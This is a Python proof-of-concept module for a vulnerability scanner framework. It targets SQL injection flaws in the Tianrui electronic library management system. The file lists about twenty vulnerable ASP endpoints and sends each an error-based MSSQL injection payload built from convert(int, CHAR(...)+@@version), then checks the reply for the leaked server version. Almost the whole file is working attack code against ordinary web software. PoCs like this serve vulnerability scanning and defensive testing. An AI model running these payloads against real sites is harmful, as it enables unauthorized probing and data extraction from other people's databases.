# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'fc58b88b-963c-4a20-99c0-906fde8aa777'
    name = '天睿电子图书管理系统多处SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-22'  # 漏洞公布时间
    desc = '''
        天睿电子图书管理系统多处SQL注入：
        /gl_bofangdell.asp?id=11
        /gl_xiu.asp?id=1
        /gl_shan.asp?id=1
        /gl_fl_xiu.asp?id=1
        /gl_fl_shan.asp?id=1
                
        /gl_fl_xiu2.asp?id=1
        /gl_gydell.asp?id=1
        /gl_lj_shan.asp?id=1
        /gl_pl_shen.asp?id=55
        /gl_pl_shan.asp?id=1
                
        /gl_pl_shan.asp?id=1
        /gl_tj_1.asp?id=1
        /gl_tj_2.asp?id=1
        /gl_tz_shan.asp?id=1
        /gl_tz_xian.asp?id=1
              
        /gl_us_shan.asp?id=23
        /gl_xiu.asp?id=23
        /gl_xiu2.asp?id=23
        /down.asp?id=1       
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0121549
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '天睿电子图书管理系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '848ca268-35fd-4eca-98f0-092d0f472b0e'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                arg + '/gl_bofangdell.asp?id=11',
                arg + '/gl_xiu.asp?id=1',
                arg + '/gl_shan.asp?id=1',
                arg + '/gl_fl_xiu.asp?id=1',
                arg + '/gl_fl_shan.asp?id=1',
                
                arg + '/gl_fl_xiu2.asp?id=1',
                arg + '/gl_gydell.asp?id=1',
                arg + '/gl_lj_shan.asp?id=1',
                arg + '/gl_pl_shen.asp?id=55',
                arg + '/gl_pl_shan.asp?id=1',
                
                arg + '/gl_pl_shan.asp?id=1',
                arg + '/gl_tj_1.asp?id=1',
                arg + '/gl_tj_2.asp?id=1',
                arg + '/gl_tz_shan.asp?id=1',
                arg + '/gl_tz_xian.asp?id=1',
                
                arg + '/gl_us_shan.asp?id=23',
                arg + '/gl_xiu.asp?id=23',
                arg + '/gl_xiu2.asp?id=23',
                arg + '/down.asp?id=1'
            ]
            for url in urls:
                url += '%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
                code, head, res, err, _ = hh.http(url)
                if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            url = arg + '/gl_tz_she.asp?zt=11%20WHERE%201=1%20AND%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--'
            code, head, res, err, _ = hh.http(url)
            if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()